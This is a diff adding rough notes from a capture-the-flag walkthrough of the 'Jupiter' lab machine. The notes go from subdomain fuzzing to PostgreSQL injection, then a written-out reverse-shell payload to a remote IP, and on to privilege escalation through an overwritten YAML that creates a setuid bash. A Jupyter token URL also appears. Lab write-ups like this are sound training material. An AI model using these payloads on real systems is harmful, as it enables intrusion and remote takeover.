@@ -1,0 +1,67 @@
+nmap scanning --> port 22,80 is open.
+--> add hosts to check the web page on port 80
+
+
+email finded : support@jupiter.htb
+
+by using wappalyzer to check--> the web page is using Nginx version 1.18.0
+
+--> this contains some of vulnarable --> search this version then we can find some of thems useful --> might contains to connect port 22
+
+--> scan by using ffuf or gobuster for subdomain
+
+ffuf -u http://jupiter.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -fc 301 -H "Host: FUZZ.jupiter.htb"
+
+
+got from scanning : [Status: 200, Size: 34390, Words: 2150, Lines: 212, Duration: 298ms]
+    * FUZZ: kiosk
+
+test on burpsuite we can see on /api/ds/querry contain maybe sql vuln --> try search postgres cmd execute 
+
+check this to exploit and get shell : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution
+
+the web note have the cmd_exec show follow the payload all the things github let create it then  make a command to get shell
+
+payload to get the shell : "COPY cmd_exec FROM PROGRAM 'bash -c  \"bash -i >& /dev/tcp/10.10.14.114/9001 0>&1\"';"
+
+get shell 
+
+--> import hold the shell : python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+stty raw -echo ;fg
+
+upload pspy64 to see the process --> this indo might cool : /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml 
+
+that file can overwiten :
+
+hosts:
+  # a host with the hostname 'server'
+  server:
+    network_node_id: 0
+    processes:
+    - path: /usr/bin/cp
+      args: /bin/bash /tmp/bash
+      start_time: 3s
+  # three hosts with hostnames 'client1', 'client2', and 'client3'
+  client:
+    network_node_id: 0
+    quantity: 3
+    processes:                                                
+    - path: /usr/bin/chmod
+      args: u+s /tmp/bash
+      start_time: 5s    
+
+ okay let move to /tmp to see juno 
+
+http://127.0.0.1:8888/?token=d98a3de194f0615cef11a9c9b3c6072e815b002dfe5889e5
+
+catch the reverse by python in that web 
+
+need some edit the file config.json to get the root flag
+
+on http:.... --> file:///root/root.txt --> edit the path to /tmp/tle.
+
+get ROOT -> solved 
+
+
+
